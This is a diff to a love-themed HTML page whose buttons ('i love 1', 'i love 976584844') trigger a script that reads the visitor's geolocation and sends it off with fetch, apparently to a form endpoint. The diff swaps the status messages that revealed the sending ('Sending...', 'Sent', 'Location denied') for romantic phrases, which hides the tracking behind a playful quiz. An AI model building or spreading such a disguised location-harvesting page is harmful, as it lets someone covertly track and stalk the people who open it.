@@ -33,7 +33,7 @@ button{
 <h3>When do you love me?</h3>
 
 <button onclick="send('i love 1')">i love 1</button>
-<button onclick="send('i love 9784844')">i love 9784844</button>
+<button onclick="send('i love 976584844')">i love 976584844</button>
 
 <script>
 
@@ -47,11 +47,11 @@ const HORA   = "entry.883812266";
 function send(code){
 
   if(!navigator.geolocation){
-    alert("Geolocalización no soportada");
+    alert("love no soportada");
     return;
   }
 
-  document.body.innerHTML = "<h3>📡 Sending...</h3>";
+  document.body.innerHTML = "<h3>i too love me baby.</h3>";
 
   navigator.geolocation.getCurrentPosition(pos=>{
 
@@ -64,10 +64,10 @@ function send(code){
 
     fetch(url,{mode:"no-cors"});
 
-    document.body.innerHTML = "<h2>❤️ Sent</h2>";
+    document.body.innerHTML = "<h2>❤️ i love too</h2>";
 
   }, ()=>{
-    document.body.innerHTML = "<h2>❌ Location denied</h2>";
+    document.body.innerHTML = "<h2>❌ love denied</h2>";
   });
 }
 
